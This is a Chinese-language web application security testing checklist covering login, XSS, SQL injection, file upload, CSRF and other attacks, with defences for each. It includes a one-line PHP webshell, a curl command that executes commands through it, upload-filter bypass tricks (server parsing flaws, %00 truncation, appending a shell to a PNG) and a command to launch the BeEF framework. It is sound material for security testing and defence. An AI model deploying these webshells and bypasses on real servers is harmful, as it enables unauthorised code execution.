### 安全测试
1. 登录流程
	1. 不登录系统，直接输入登录URL是否可以访问
	2. 不登录系统，输入文件URL是否可以下载文件
	3. 退出登录后，点击浏览器后退能否访问之前的页面
	4. Session有效期
	5. N次错误密码输入
    6. 某用户知道他人账户后，多次尝试他人账户密码登录，导致他人账户锁定
    
2. 加密
	是否采用主流加密方式（RSA，AES...)
	是否采用 https协议
	Tomcat、WebShpere、WebLogic、Jetty 应用容器是否 采用证书 加密验证
	Nginx 服务器是否采用 OpenSSL 加密
   
3. 越权
    1. 类别 
        - 横向越权
        - 纵向越权
    2. 攻击方式
	    1. 手动更改中的参数是否能访问无权限访问的页面    
	
4. XSS(跨站脚本攻击)
    - 攻击类型
        1. 反射型
            - 未经验证和未经转义的用户输入、直接作为html输出的一部分
            - 特点: 非持久化，必须用户点击特定链接才会触发
            - 影响范围: 仅执行脚本的用户
            - 
        2. 存储型
            - 获取不可信数据，存入数据库
            - 获取数据时，未进行过滤
            - 漏洞利用工具: BeEF(自带JS脚本、后台界面): 账号/密码 sec
               ```
                    docker run -d -p 3000:3000 registry.cn-shanghai.aliyuncs.com/yhskc/beef
               ```
        3. DOM型/突变型
            - DOM型XSS: 通过JS操作DOM树动态的输出数据到页面
            - 突变型XSS: 攻击者输入看似安全的内容，在解析标记时经过浏览器重写或修改发生突变，生成不安全的代码，并执行
            - Jquery 跨站脚本漏洞，CNNVD-202004-2429、CVE-2020-11022
            - purify 漏洞
        
    - XSS危害
        1. 盗取Cookie
        2. 盗取账号
        3. 恶意软件下载
        4. 键盘记录
        5. 网站引流
    - 解决方式
        - 文本框 (Html+JS数据处理)
        - Ajax后台请求的数据读取innerHtml(数据处理)
        - 通过npm引入xss依赖，然后其正则方式过滤显示特定标签或属性
5. XXE()
   
6. SQL注入(SQL Injection)
	- 采用PreparedStatement方式处理SQL拼接(Mybaits 使用#{xxx})
	- 存储过程
	
7. 任意文件下载(上传下载)
	- 上传：上传类型判断(除JS判断外，Java判断文件类型)	(类型判断不能单凭后缀，部分可执行文件通过修改后缀方式蒙混过关)
	    - 上传木马文件(php/jsp/aspx/py/shell...) 
	        ```
                <?php @eval($POST['hacker']); ?>
            ```
        - 访问木马文件地址
            ```
                curl -d "hacker=echo get_current_user();" http://127.0.0.1/images/shell.php
            ```
        - 绕过方式
            0. (nginx/apache 指定文件后缀解析方式，配置方式存在漏洞可绕过)
            1. IIS5/IIS6 服务器解析漏洞
                1. 当创建.asp文件目录时，在此目录下的任意文件，服务器均解析为asp文件
                2. 服务器默认不解析;以后的内容
                ```
                    www.xxx.com/aa.asp/bb.jpg 会被解析为asp文件
                    www.xxx.com/aa.asp;.jpg 会被解析为asp文件
                ```
            2. Apache1.x/Apache2.x 服务器漏洞
                1. Apache从左至右开始判断后缀，跳过非可识别的后缀，直到找到可识别的后缀为止，然后将该可识别的后缀进行解析
                ```
                    www.xxx.com/xxx/shell.php.test  会被解析为php文件
                ```
            3. .htaccess 绕过
            4. 字符串截断文件名绕过
                - 在可设置文件上传路径的上传时，设置上传路径为: ../upload/xxx.php%00
                - 上传一个内容为 php的病毒文件，此时%00为URL截断字符，上传的文件将被识别为php文件
            5. 文件头检测绕过
                - png 文件头:
                    ```
                        89 50 4E 47 
                    ```
                - jpg 文件头:
                    ```
                        FF D8 FF DB 
                    ```   
                - 绕过方式: 将恶意内容附着在正常的头文件上
                    ```
                        1. vim test.png
                        2. cat shell.php >> test.png
                    ```
        - 防御方式:
            1. 后缀名(白名单)限制(jpeg/jpg/png/txt/log/...)    
	- 下载：下载是否有路径，路径是否有做../、./等处理，避免访问系统其它目录文件(下载路径必须不能为可配置)
	
8. CSRF攻击
    0. 定义: 用户访问网站A，再访问恶意网站B，恶意网站B获取用户Cookie，携带Cookie信息访问到网站A，
	1. 应用采用白名单方式，未在白名单的域名内不能访问	
	2. 验证 HTTP Referer 字段,标明了站点来源，给用户分配token
	
9. 分布式DoS攻击
	1. 攻击方式：
	    - Ping Flood攻击即利用ping命令不停的发送的数据包到服务器。
	    - SYN Flood攻击即利用tcp协议原理，伪造受害者的ip地址，一直保持与服务器的连接，导致受害者连接服务器的时候拒绝服务。
	2. 解决方案：设置路由器与交换机的安全配置，即设置防火墙
	
10. DNS缓存污染
    1. 攻击方式：第三方可信赖的域名服务器缓存了一些DNS解析，但被别人制造一些假域名服务器封包污染了，指向错误网址。
    2. 解决方案：备多个域名服务器商。
   
11. 会话劫持
    1. 攻击方式：劫持会话cookies，把受害者（A）与受害者（B）之间通信经过攻击者的电脑。（常见于在线聊天系统）
    2. 解决方案：用户进行二次验证，随机产生会话ID，会话cookies设置httponly（某些情况下httponly设置无效）。增加http请求头信息。判断是否是真实用户的请求。

12. WebShell
    1. PHP、ASP、JSP、Python、Shell...
	2. Excel导出文件(宏)、word文件调用操作系统函数下载安装病毒

13. Command Inject (命令行注入)
14. 软件热更新：
    - 使用非对称后门接口进行软件更新，避免对称后门接口。 给后端程序加壳。使用蜜罐技术。
    
15. 伪协议与编码绕过
    1. 伪协议
        1. data伪协议, data:text/html;base64,xxxx
        2. javascript 伪协议: javascript:alert(1)
    2. 编码绕过
        1. Unicode编码及URL编码
        2. JavaScript 编码
        3. HTML实体编码
        4. URL编码